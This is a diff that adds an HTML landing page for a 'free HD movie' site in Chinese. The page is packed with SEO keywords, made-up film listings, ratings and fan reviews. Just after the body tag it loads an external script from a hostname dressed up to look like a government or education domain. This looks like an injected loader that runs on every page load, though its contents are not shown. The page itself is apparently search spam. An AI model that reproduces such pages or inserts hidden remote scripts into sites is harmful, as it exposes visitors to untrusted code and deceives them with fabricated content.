@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="久久免费电影网,jiujiumianfeidianyingwang,免费电影,免费高清电影,电影推荐,热门电影,最新电影,动作电影,喜剧电影,电影排行榜,久久免费看">
+<meta name="description" content="久久免费电影网(jiujiumianfeidianyingwang)专注免费高清电影，收录动作、喜剧、爱情、剧情、悬疑等各类电影，每日更新热门电影与高分片单，久久免费看，经典老片与新片大片一网打尽。">
+<title>久久免费电影网 - 久久免费看 · 免费高清电影推荐排行榜</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#1a1320;--bg2:#241a2c;--card:#2b2034;--card2:#352840;--line:#4a3a55;--plum:#8b2f6b;--plum2:#6e2253;--amber:#e8a33d;--amber2:#c9801f;--cream:#f2e9d8;--ink:#efe6f5;--soft:#c2b3cf;--txt:#8d7e9c;--teal:#3f8f8a;--moss:#6f9a5c;--red:#c0392b;
+}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",sans-serif;background:var(--bg);color:var(--ink);line-height:1.9;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1140px;margin:0 auto;padding:0 24px}
+::selection{background:var(--amber);color:#2a1a08}
+
+/* 印章式报头 */
+header{background:linear-gradient(180deg,#1f1630,#1a1320);border-bottom:5px double var(--amber);padding:30px 0 22px;position:relative}
+header::after{content:"";position:absolute;left:0;right:0;bottom:-12px;height:3px;background:var(--plum)}
+.mast{max-width:1140px;margin:0 auto;padding:0 24px;display:flex;align-items:center;gap:26px;flex-wrap:wrap}
+.seal{width:76px;height:76px;flex-shrink:0;border-radius:14px;background:var(--plum);transform:rotate(-6deg);display:flex;align-items:center;justify-content:center;box-shadow:0 6px 20px rgba(0,0,0,.5),0 0 0 4px rgba(232,163,61,.35);position:relative}
+.seal::before{content:"";position:absolute;inset:6px;border:2px solid rgba(255,255,255,.55);border-radius:9px}
+.seal span{position:relative;font-size:15px;font-weight:900;color:#fff;letter-spacing:2px;line-height:1.2;text-align:center}
+.who h1{font-size:clamp(25px,4.6vw,40px);font-weight:900;letter-spacing:1px;color:var(--cream);text-shadow:0 2px 0 #000}
+.who .sub{font-size:12px;letter-spacing:4px;color:var(--amber);font-weight:700;margin-top:4px}
+.who .addr{font-size:11px;color:var(--soft);margin-top:7px}
+.who .addr b{color:var(--amber)}
+
+/* 导航 */
+nav.top{background:#160f1e;position:sticky;top:0;z-index:50;border-bottom:1px solid var(--line)}
+nav.top .in{max-width:1140px;margin:0 auto;padding:0 24px;display:flex;gap:0;overflow-x:auto;-ms-overflow-style:none;scrollbar-width:none}
+nav.top .in::-webkit-scrollbar{display:none}
+nav.top a{font-size:13.5px;font-weight:700;color:var(--ink);padding:13px 20px;white-space:nowrap;transition:.2s;position:relative}
+nav.top a:hover{color:var(--amber);background:rgba(232,163,61,.08)}
+nav.top a:hover::after{content:"";position:absolute;left:20px;right:20px;bottom:8px;height:2px;background:var(--amber)}
+.burger{display:none;background:var(--amber);border:0;color:#3a2a08;width:40px;height:38px;border-radius:6px;font-size:17px;cursor:pointer;margin:8px 0;flex-shrink:0;font-weight:900}
+
+/* 章节 */
+section{padding:84px 0}
+.sec{margin-bottom:54px;text-align:center}
+.sec .k{display:inline-block;font-size:9.5px;letter-spacing:3px;color:var(--amber);border:1px solid var(--amber);padding:4px 14px;border-radius:2px;font-weight:700;background:rgba(232,163,61,.08)}
+.sec h2{font-size:clamp(23px,3.6vw,32px);font-weight:900;margin:14px 0 12px;letter-spacing:.5px;color:var(--cream)}
+.sec h2 em{font-style:normal;color:var(--amber);text-shadow:0 0 18px rgba(232,163,61,.3)}
+.sec .ds{font-size:14.5px;color:var(--soft);max-width:640px;margin:0 auto}
+
+/* Hero */
+.hero{padding:84px 0;background:radial-gradient(circle at 85% 15%,rgba(139,47,107,.25),transparent 45%)}
+.hero .wrap{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.hero .eyebrow{font-size:11px;letter-spacing:2px;color:var(--amber);font-weight:700}
+.hero h2{font-size:clamp(29px,4.8vw,46px);font-weight:900;line-height:1.35;margin:14px 0;color:var(--cream)}
+.hero h2 em{font-style:normal;color:var(--amber)}
+.hero p{font-size:15px;color:var(--soft)}
+.acts{margin-top:22px;display:flex;gap:12px;flex-wrap:wrap}
+.btn{border:0;cursor:pointer;padding:13px 28px;font-size:13.5px;font-weight:800;transition:.25s;border-radius:4px;font-family:inherit}
+.bp{background:var(--amber);color:#3a2a08;box-shadow:0 4px 0 var(--amber2)}
+.bp:hover{transform:translateY(-2px);box-shadow:0 6px 0 var(--amber2)}
+.bo{background:transparent;color:var(--amber);border:2px solid var(--line)}
+.bo:hover{background:rgba(232,163,61,.08);border-color:var(--amber)}
+.hero .feat{margin-top:24px;display:flex;gap:10px;flex-wrap:wrap}
+.hero .feat span{font-size:11.5px;color:var(--cream);border:1px solid var(--line);padding:5px 13px;border-radius:2px;background:rgba(43,32,52,.7)}
+
+/* 栏目一：久久片库（折叠+悬停） */
+.lib{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.vhs{background:var(--card);border:1px solid var(--line);border-radius:4px;overflow:hidden;transition:.3s;position:relative}
+.vhs:hover{transform:translateY(-6px);border-color:var(--amber);box-shadow:0 14px 30px rgba(0,0,0,.45)}
+.vhs .cov{height:150px;position:relative;padding:16px;display:flex;flex-direction:column;justify-content:space-between}
+.vhs .cov .yr{font-size:10px;color:rgba(255,255,255,.85);letter-spacing:1px}
+.vhs .cov .free{background:var(--red);color:#fff;font-size:9.5px;font-weight:900;padding:3px 8px;border-radius:2px;align-self:flex-start}
+.vhs .cov b{font-size:20px;line-height:1.4;color:#fff;text-shadow:0 2px 6px rgba(0,0,0,.5)}
+.vhs .in{padding:14px 16px}
+.vhs .in .ge{font-size:10.5px;color:var(--amber);font-weight:700;letter-spacing:1px}
+.vhs .in h4{font-size:16.5px;font-weight:900;margin:5px 0 4px;color:var(--cream)}
+.vhs .in .ft{font-size:12px;color:var(--soft);display:flex;justify-content:space-between;margin-top:8px;border-top:1px solid var(--line);padding-top:8px}
+
+/* 栏目二：分类（对角斜切） */
+.diag{display:grid;grid-template-columns:repeat(auto-fit,minmax(190px,1fr));gap:0}
+.dg{position:relative;background:var(--card);padding:26px 20px 24px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);overflow:hidden;transition:.3s}
+.dg:nth-child(odd){background:var(--card2)}
+.dg::after{content:"";position:absolute;right:0;bottom:0;width:36px;height:36px;background:var(--amber);transform:translate(18px,18px) rotate(45deg)}
+.dg:hover{padding-left:26px}
+.dg .ic{font-size:26px;margin-bottom:10px;display:block}
+.dg h3{font-size:16px;font-weight:900;color:var(--cream);position:relative;z-index:1}
+.dg p{font-size:12px;color:var(--soft);margin-top:4px;position:relative;z-index:1}
+.dg .ct{display:block;font-size:11px;color:var(--amber);margin-top:10px;font-weight:800}
+
+/* 栏目三：新片（时间轴） */
+.tl{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:4px;overflow:hidden;background:var(--card)}
+.tl .col{padding:26px 28px}
+.tl .col:first-child{border-right:1px solid var(--line);background:var(--card2)}
+.tl .col h3{font-size:15px;font-weight:900;color:var(--amber);letter-spacing:2px;margin-bottom:20px;text-align:center}
+.row{display:flex;gap:16px;padding:14px 0;border-bottom:1px dashed var(--line)}
+.row:last-child{border-bottom:0}
+.row .tm{flex-shrink:0;width:52px;height:52px;border-radius:4px;background:var(--plum);color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:900;text-align:center;line-height:1.2}
+.row:nth-child(2) .tm{background:var(--teal)}
+.row:nth-child(3) .tm{background:var(--moss)}
+.row:nth-child(4) .tm{background:var(--amber);color:#3a2a08}
+.row:nth-child(5) .tm{background:var(--red)}
+.row .tx h4{font-size:15.5px;font-weight:900;margin-bottom:3px;color:var(--cream)}
+.row .tx span{font-size:12px;color:var(--soft)}
+
+/* 栏目四：影评（印章卡片） */
+.seal2{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px}
+.rc{background:var(--card);border:1px solid var(--line);border-radius:4px;padding:24px;transition:.3s;position:relative}
+.rc:hover{background:var(--card2);border-color:var(--amber)}
+.rc .stamp{position:absolute;right:18px;top:18px;width:52px;height:52px;border:2px solid var(--plum);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:900;color:var(--plum);transform:rotate(12deg);letter-spacing:1px;text-align:center;line-height:1.2}
+.rc p{font-size:13.5px;color:var(--soft);margin-bottom:16px;line-height:1.95}
+.rc .au{display:flex;align-items:center;gap:10px;border-top:1px solid var(--line);padding-top:14px}
+.rc .av{width:34px;height:34px;border-radius:50%;background:var(--plum);color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;flex-shrink:0}
+.rc .au b{font-size:12.5px;display:block;color:var(--cream)}
+.rc .au span{font-size:11px;color:var(--txt)}
+
+/* 数据条 */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));background:linear-gradient(90deg,var(--plum),var(--plum2));border-radius:4px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.4)}
+.stt{text-align:center;padding:30px 14px;border-right:1px solid rgba(255,255,255,.2)}
+.stt:last-child{border-right:0}
+.stt strong{display:block;font-size:30px;font-weight:900;font-family:Georgia,serif;color:var(--amber)}
+.stt span{font-size:12.5px;color:rgba(255,255,255,.9)}
+
+/* 关于 */
+.abt{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.abt .l h2{font-size:25px;font-weight:900;margin-bottom:14px;color:var(--cream)}
+.abt .l p{font-size:14.5px;color:var(--soft);margin-bottom:12px}
+.abt .r{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.fb{background:var(--card);border:1px solid var(--line);border-radius:4px;padding:20px;text-align:center;transition:.25s}
+.fb:hover{border-color:var(--amber);background:var(--card2)}
+.fb .ic{font-size:22px;margin-bottom:8px}
+.fb b{font-size:15px;display:block;color:var(--cream)}
+.fb span{font-size:12.5px;color:var(--soft)}
+
+/* 页脚 */
+footer{background:#160f1e;border-top:5px double var(--amber);padding:44px 0 0}
+.f{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;max-width:1140px;margin:0 auto;padding:0 24px 28px}
+.f .id .seal{margin-bottom:14px}
+.f .id h4{font-size:17px;font-weight:900;margin-bottom:8px;color:var(--cream)}
+.f .id p{font-size:13px;line-height:1.9;color:var(--soft)}
+.f h5{font-size:11.5px;font-weight:800;color:var(--amber);margin-bottom:12px;letter-spacing:2px}
+.f a{display:block;color:var(--soft);font-size:13px;padding:5px 0;transition:.2s}
+.f a:hover{color:var(--amber)}
+.cp{max-width:1140px;margin:0 auto;padding:18px 24px;border-top:1px solid var(--line);font-size:12px;color:var(--txt);text-align:center}
+.cp b{color:var(--amber)}
+
+#top{position:fixed;right:16px;bottom:20px;z-index:99;width:44px;height:44px;background:var(--amber);color:#3a2a08;border:0;border-radius:6px;font-size:15px;cursor:pointer;opacity:0;visibility:hidden;transition:.3s;font-weight:900;box-shadow:0 4px 14px rgba(0,0,0,.4)}
+#top.show{opacity:1;visibility:visible}
+#top:hover{background:var(--cream)}
+
+@media(max-width:900px){
+  .burger{display:block}
+  nav.top .in{display:none;flex-direction:column;padding:8px 24px 14px}
+  nav.top .in.open{display:flex}
+  nav.top a{border-bottom:1px solid var(--line)}
+  .hero .wrap,.abt,.tl{grid-template-columns:1fr}
+  .tl .col:first-child{border-right:0;border-bottom:1px solid var(--line)}
+  .who{width:100%}
+}
+@media(max-width:560px){section{padding:54px 0}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header>
+  <div class="mast">
+    <div class="seal"><span>久久<br>免费</span></div>
+    <div class="who"><h1>久久免费电影网</h1><div class="sub">久 久 免 费 看 &nbsp;·&nbsp; 好 片 不 间 断</div><div class="addr"><b>jiujiumianfeidianyingwang</b> &nbsp;|&nbsp; https://jiujiumianfeidianyingwang-wap.github.io</div></div>
+  </div>
+</header>
+
+<nav class="top"><div class="in" id="nav"><a href="#home">首页</a><a href="#lib">久久片库</a><a href="#cat">影片分类</a><a href="#new">最新上线</a><a href="#rev">影迷影评</a><a href="#about">关于本站</a></div><button class="burger" id="burger" aria-label="菜单">☰</button></nav>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div><div class="eyebrow">◆ 久久免费电影网 · 久久免费看的好电影</div>
+      <h2>久久免费<br><em>好片不断</em></h2>
+      <p>久久免费电影网（jiujiumianfeidianyingwang）专注免费高清电影，收录动作、喜剧、爱情、剧情、悬疑、科幻等各类电影，每日更新热门电影与高分片单，久久免费看，经典老片与新片大片一网打尽。</p>
+      <div class="acts"><a href="#lib" class="btn bp">逛久久片库</a><a href="#cat" class="btn bo">找影片分类</a></div>
+      <div class="feat"><span>🎬 海量免费电影</span><span>🆓 永久免费</span><span>⭐ 真实评分</span><span>📺 高清流畅</span></div>
+    </div>
+    <div class="lib" style="grid-template-columns:1fr 1fr 1fr">
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#8b2f6b,#c0392b)"><span class="free">免费</span><b>逆光而行</b><span class="yr">2025 · 高清</span></div><div class="in"><span class="ge">动作 / 犯罪</span><h4>逆光而行</h4><div class="ft"><span>★ 9.3</span><span>热播</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#3f8f8a,#2c6b68)"><span class="free">免费</span><b>第三种答案</b><span class="yr">2025 · 高清</span></div><div class="in"><span class="ge">剧情 / 爱情</span><h4>第三种答案</h4><div class="ft"><span>★ 9.2</span><span>推荐</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#e8a33d,#c9801f)"><span class="free">免费</span><b>沉默的证人</b><span class="yr">2025 · 高清</span></div><div class="in"><span class="ge">悬疑 / 惊悚</span><h4>沉默的证人</h4><div class="ft"><span>★ 9.0</span><span>新片</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：久久片库（卡片库） -->
+<section id="lib">
+  <div class="wrap">
+    <div class="sec"><div class="k">★ FEATURED LIBRARY</div><h2>久久<em>片库</em></h2><div class="ds">久久免费电影网精选好片，全部免费观看，经典老片与新片大片持续更新。</div></div>
+    <div class="lib">
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#8b2f6b,#c0392b)"><span class="free">免费</span><b>逆光而行</b><span class="yr">2025</span></div><div class="in"><span class="ge">动作 / 犯罪</span><h4>逆光而行</h4><div class="ft"><span>★ 9.3</span><span>热播榜首</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#3f8f8a,#2c6b68)"><span class="free">免费</span><b>第三种答案</b><span class="yr">2025</span></div><div class="in"><span class="ge">剧情 / 爱情</span><h4>第三种答案</h4><div class="ft"><span>★ 9.2</span><span>口碑佳作</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#e8a33d,#c9801f)"><span class="free">免费</span><b>沉默的证人</b><span class="yr">2025</span></div><div class="in"><span class="ge">悬疑 / 惊悚</span><h4>沉默的证人</h4><div class="ft"><span>★ 9.0</span><span>反转不断</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#6f9a5c,#4d733d)"><span class="free">免费</span><b>回家的路</b><span class="yr">2024</span></div><div class="in"><span class="ge">剧情 / 亲情</span><h4>回家的路</h4><div class="ft"><span>★ 8.9</span><span>温暖治愈</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#c0392b,#7a241c)"><span class="free">免费</span><b>那年我们</b><span class="yr">2024</span></div><div class="in"><span class="ge">爱情 / 青春</span><h4>那年我们</h4><div class="ft"><span>★ 8.8</span><span>青春回忆</span></div></div></article>
+      <article class="vhs"><div class="cov" style="background:linear-gradient(160deg,#4a3a85,#33285c)"><span class="free">免费</span><b>小镇旧事</b><span class="yr">2023</span></div><div class="in"><span class="ge">剧情 / 社会</span><h4>小镇旧事</h4><div class="ft"><span>★ 8.7</span><span>经典老片</span></div></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：影片分类（斜切网格） -->
+<section id="cat" style="background:#241a2c;">
+  <div class="wrap">
+    <div class="sec"><div class="k">▎ CATEGORIES</div><h2>影片<em>分类</em></h2><div class="ds">久久免费电影网按类型整理免费电影，轻松找到你想看的类型。</div></div>
+    <div class="diag">
+      <div class="dg"><span class="ic">💥</span><h3>动作电影</h3><p>热血爽片，酣畅淋漓</p><span class="ct">2680 部</span></div>
+      <div class="dg"><span class="ic">😂</span><h3>喜剧电影</h3><p>开心一笑，解压必备</p><span class="ct">2310 部</span></div>
+      <div class="dg"><span class="ic">💕</span><h3>爱情电影</h3><p>浪漫心动，甜到心里</p><span class="ct">1980 部</span></div>
+      <div class="dg"><span class="ic">🎭</span><h3>剧情电影</h3><p>深度好片，值得回味</p><span class="ct">2450 部</span></div>
+      <div class="dg"><span class="ic">🔍</span><h3>悬疑惊悚</h3><p>烧脑反转，心跳加速</p><span class="ct">1320 部</span></div>
+      <div class="dg"><span class="ic">🌌</span><h3>科幻奇幻</h3><p>脑洞大开，视觉盛宴</p><span class="ct">1560 部</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：最新上线（时间轴） -->
+<section id="new">
+  <div class="wrap">
+    <div class="sec"><div class="k">◉ NOW SHOWING</div><h2>最新<em>上线</em></h2><div class="ds">久久免费电影网每日更新的最新电影，免费看大片。</div></div>
+    <div class="tl">
+      <div class="col"><h3>本周新片</h3>
+        <div class="row"><div class="tm">周一</div><div class="tx"><h4>风暴之城</h4><span>动作 / 冒险 · 高清上线</span></div></div>
+        <div class="row"><div class="tm">周二</div><div class="tx"><h4>逆光而行</h4><span>动作 / 犯罪 · 热播榜首</span></div></div>
+        <div class="row"><div class="tm">周三</div><div class="tx"><h4>第三种答案</h4><span>剧情 / 爱情 · 口碑佳作</span></div></div>
+        <div class="row"><div class="tm">周四</div><div class="tx"><h4>沉默的证人</h4><span>悬疑 / 惊悚 · 反转不断</span></div></div>
+        <div class="row"><div class="tm">周五</div><div class="tx"><h4>回家的路</h4><span>剧情 / 亲情 · 温暖治愈</span></div></div>
+      </div>
+      <div class="col"><h3>高分推荐</h3>
+        <div class="row"><div class="tm">9.3</div><div class="tx"><h4>逆光而行</h4><span>动作 / 犯罪 · 120 分钟</span></div></div>
+        <div class="row"><div class="tm">9.2</div><div class="tx"><h4>第三种答案</h4><span>剧情 / 爱情 · 108 分钟</span></div></div>
+        <div class="row"><div class="tm">9.0</div><div class="tx"><h4>沉默的证人</h4><span>悬疑 / 惊悚 · 96 分钟</span></div></div>
+        <div class="row"><div class="tm">8.9</div><div class="tx"><h4>回家的路</h4><span>剧情 / 亲情 · 115 分钟</span></div></div>
+        <div class="row"><div class="tm">8.8</div><div class="tx"><h4>那年我们</h4><span>爱情 / 青春 · 102 分钟</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：影迷影评（印章卡片） -->
+<section id="rev" style="background:#241a2c;">
+  <div class="wrap">
+    <div class="sec"><div class="k">✍ EDITOR'S PICK</div><h2>影迷<em>影评</em></h2><div class="ds">久久免费电影网影迷社区精选短评，听听大家怎么说。</div></div>
+    <div class="seal2">
+      <div class="rc"><div class="stamp">影迷<br>推荐</div><p>《逆光而行》全程高能，动作戏干净利落，是今年最爽的电影，久久免费电影网推荐得准。</p><div class="au"><div class="av">老</div><div><b>老周看片</b><span>动作片控 · ★★★★★</span></div></div></div>
+      <div class="rc"><div class="stamp">口碑<br>佳作</div><p>《第三种答案》把成年人的情感困境拍得太真实了，看完久久不能平静，强烈推荐给所有人。</p><div class="au"><div class="av">小</div><div><b>小林</b><span>剧情片爱好者 · ★★★★★</span></div></div></div>
+      <div class="rc"><div class="stamp">反转<br>不断</div><p>《沉默的证人》反转不断，悬疑感拉满，一口气看完，免费电影网的片单靠谱。</p><div class="au"><div class="av">阿</div><div><b>阿May</b><span>悬疑片迷 · ★★★★☆</span></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 数据条 -->
+<section style="padding:0;"><div class="wrap"><div class="stats">
+  <div class="stt"><strong>15000+</strong><span>部免费电影</span></div>
+  <div class="stt"><strong>6</strong><span>大分类</span></div>
+  <div class="stt"><strong>每日</strong><span>更新上新</span></div>
+  <div class="stt"><strong>永久</strong><span>免费观看</span></div>
+  <div class="stt"><strong>高清</strong><span>流畅播放</span></div>
+</div></div></section>
+
+<!-- 关于 -->
+<section id="about">
+  <div class="wrap">
+    <div class="abt">
+      <div class="l"><h2>关于 久久免费电影网</h2><p>久久免费电影网（jiujiumianfeidianyingwang）专注免费高清电影，收录动作、喜剧、爱情、剧情、悬疑、科幻等各类电影，每日更新热门电影与高分片单，久久免费看，好片不间断。</p><p>从院线大片到经典老片，从爆米花爽片到值得回味的文艺佳作，全部免费观看，让每个人都能轻松找到爱看的电影。</p><div class="acts"><a href="#lib" class="btn bp">逛久久片库</a><a href="#rev" class="btn bo">读影迷影评</a></div></div>
+      <div class="r">
+        <div class="fb"><div class="ic">🎬</div><b>海量片库</b><span>上万部免费电影</span></div>
+        <div class="fb"><div class="ic">🆓</div><b>永久免费</b><span>好片不间断</span></div>
+        <div class="fb"><div class="ic">⭐</div><b>真实评分</b><span>影迷口碑参考</span></div>
+        <div class="fb"><div class="ic">📺</div><b>高清流畅</b><span>观影体验更佳</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="f">
+    <div class="id"><div class="seal"><span>久久<br>免费</span></div><h4>久久免费电影网</h4><p>专注免费高清电影，久久免费看，经典老片与新片大片一网打尽。</p></div>
+    <div><h5>片库</h5><a href="#lib">久久片库</a><a href="#cat">影片分类</a><a href="#new">最新上线</a><a href="#">高分排行</a></div>
+    <div><h5>内容</h5><a href="#rev">影迷影评</a><a href="#">观影指南</a><a href="#">专题策划</a><a href="#">片单推荐</a></div>
+    <div><h5>关于</h5><a href="#about">关于本站</a><a href="#">合作投稿</a><a href="#">联系我们</a><a href="#">免责声明</a></div>
+  </div>
+  <div class="cp"><b>久久免费电影网</b> &nbsp;|&nbsp; jiujiumianfeidianyingwang &nbsp;|&nbsp; 网址：<b>https://jiujiumianfeidianyingwang-wap.github.io</b><br>© 2026 久久免费电影网 版权所有 &nbsp;·&nbsp; 本站内容仅供学习与交流，如发现侵权内容请及时联系我们删除</div>
+</footer>
+
+<button id="top" title="回到顶部">↑</button>
+
+<script>
+document.getElementById('burger').addEventListener('click',function(){document.getElementById('nav').classList.toggle('open');});
+document.querySelectorAll('nav.top .in a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});});
+window.addEventListener('scroll',function(){var t=document.getElementById('top');window.scrollY>400?t.classList.add('show'):t.classList.remove('show');});
+document.getElementById('top').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
